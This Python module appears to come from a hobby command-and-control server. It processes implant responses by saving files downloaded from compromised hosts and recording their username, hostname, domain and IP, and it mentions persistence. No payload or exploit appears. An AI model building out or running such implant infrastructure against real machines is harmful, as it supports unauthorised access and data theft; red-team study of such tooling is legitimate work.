# This module is responsible for the post processing of all implant response information.
# It will extract, process, and store data based on which builtin functionality was used.
#   The class will be static with few public methods, and instead will focus on
import ast
import secrets

from Data.Database import Database
from Storage.settings import Settings


class ImplantResponseProcessor:
    """
    The Implant Response Processor class is designed to take data from an implant and correctly format the response to
    the user. No all response from implants is printable (i.e. file download) and not all responses have data (i.e.
    upload files, create persistence)

    For other built in commands, such as sys_info, this will add data to the host_data table, allowing up to query
    a hosts collated data. A unique host is marked by it's UIK, responses with a command_id will allow us to attribute
    all data to a specific host.

    Known issues:
     - If 2 implants are running on a single host we cannot deduplicate hosts easily
    """

    db = Database()

    @staticmethod
    def _system_info(data):
        split_data = data.decode().split("\n")
        print(split_data)  # This shoudl be a list of 4 items based on the below response.
        # Username: Kris
        # Hostname: DESKTOP - SUMPM3F
        # Domain: WORKGROUP
        # Local IP: 192.168.2.130
        return data.decode(), None

    @staticmethod
    def _file_download(data, filepath):
        """print("sub class")
        :param data: Byte encoded file
        :param filepath: The downloaded file path i.e. C:\Windows\System32\drivers\etc\hosts
        :return: None

        File download takes byte encoded data and directly writes it to a randomly named file, returning the
          file location.
        DEV:
          Parse filepath for the filename
          Check for file extensions
          Check if the file exists using SHA1
          Check writing to local file succeeds
          Check for filename uniqueness.
        """

        filename = secrets.token_hex(3)
        download_file_path = f"{Settings.file_download_folder}downloaded_file_{filename}"
        with open(download_file_path, 'wb') as file_h:
            file_h.write(data)
        return f"File downloaded: {filepath}\nFile saved to {download_file_path}"

    def process_command_response(self, command_id, command_response):
        host_data = None
        a = self.db.implant.get_registered_implant_commands_by_command_id(command_id)
        log_entry = ast.literal_eval(a['log_entry'])
        if log_entry['type'] == "FD":
            command_response = self._file_download(command_response, log_entry['args'])
        elif log_entry['type'] == "SI":
            command_response, host_data = self._system_info(command_response)
        else:
            command_response = command_response.decode()
        return command_response, host_data
